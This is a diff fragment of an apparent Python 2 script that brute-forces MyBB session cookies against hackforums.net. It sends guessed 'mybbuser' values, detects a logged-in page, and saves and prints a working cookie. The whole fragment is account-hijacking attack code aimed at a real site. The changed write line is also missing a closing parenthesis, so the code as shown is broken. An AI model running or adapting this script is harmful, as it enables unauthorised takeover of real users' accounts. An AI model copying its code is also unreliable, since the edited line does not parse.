@@ -33,15 +33,15 @@ def request(cookieGuess, howmany):
         req = urllib2.Request('http://www.hackforums.net/index.php')
         req.add_header('User-Agent', 'Mozilla/5.0 (X11; U; Linux i686; en-CA; rv:1.9.2.15) Gecko/20110303 Ubuntu/10.10 (maverick) Firefox/3.6.15')
         req.add_header('Cookie', 'mybbuser=' + str(i) + '_' + cookieGuess)
-        print str(howmany) + ': ' + str(i) + '_' + cookieGuess + ' - ' + str(len(cookieGuess))
+        print str(howmany) + ': ' + str(i) + '_' + str(cookieGuess) + ' - ' + str(len(cookieGuess))
         try:
             okayGo = urllib2.urlopen(req).read()
         except:
             request(cookieGuess, howmany)
         if 'Welcome back, ' in okayGo:
             print 'Success!'
-            print 'Cookie=' + str(i) + '_' + cookieGuess
-            hfCookie.write('mybbuser=' + str(i) + '_' + cookieGuess)
+            print 'Cookie=' + str(i) + '_' + str(cookieGuess)
+            hfCookie.write('mybbuser=' + str(i) + '_' + str(cookieGuess)
             sys.exit()
         time.sleep(1)
 
